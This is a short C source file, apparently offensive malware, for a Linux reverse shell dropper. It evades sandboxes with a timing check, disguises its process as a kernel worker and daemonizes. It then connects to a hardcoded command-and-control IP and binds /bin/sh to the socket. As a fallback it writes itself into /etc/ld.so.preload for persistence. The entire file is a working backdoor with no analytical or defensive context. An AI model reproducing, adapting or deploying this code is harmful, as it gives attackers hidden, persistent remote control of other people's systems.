// dropper.c - SleepTheGod Alpharetta reverse shell loader 2026
// gcc -o /tmp/.x11-tmp dropper.c -static -s -O2 -fno-stack-protector

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>

#define C2_IP   "173.249.20.58"
#define C2_PORT 4445
#define FAKE_NAME "[kworker/u8:2-events]"

static int anti_sandbox(void) {
    if (getppid() == 1) return 1;
    time_t s = time(NULL);
    volatile int x = 0;
    for (int i = 0; i < 100000000; i++) x += i;
    if (time(NULL) - s > 1) return 1;
    return 0;
}

int main(int argc, char **argv) {
    if (anti_sandbox()) exit(1);

    prctl(PR_SET_NAME, FAKE_NAME, 0, 0, 0);

    if (fork()) exit(0);
    setsid();
    if (fork()) exit(0);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {
        .sin_family = AF_INET,
        .sin_port   = htons(C2_PORT)
    };
    inet_pton(AF_INET, C2_IP, &a.sin_addr);

    if (connect(s, (struct sockaddr *)&a, sizeof(a)) == 0) {
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        char *sh[] = {"/bin/sh", NULL};
        execve(sh[0], sh, NULL);
    }

    // ld.so.preload fallback (noisy but works on some old kernels)
    unlink("/etc/ld.so.preload");
    FILE *f = fopen("/etc/ld.so.preload", "w");
    if (f) {
        fprintf(f, "%s\n", argv[0]);
        fclose(f);
    }

    while (1) sleep(666);
    return 0;
}
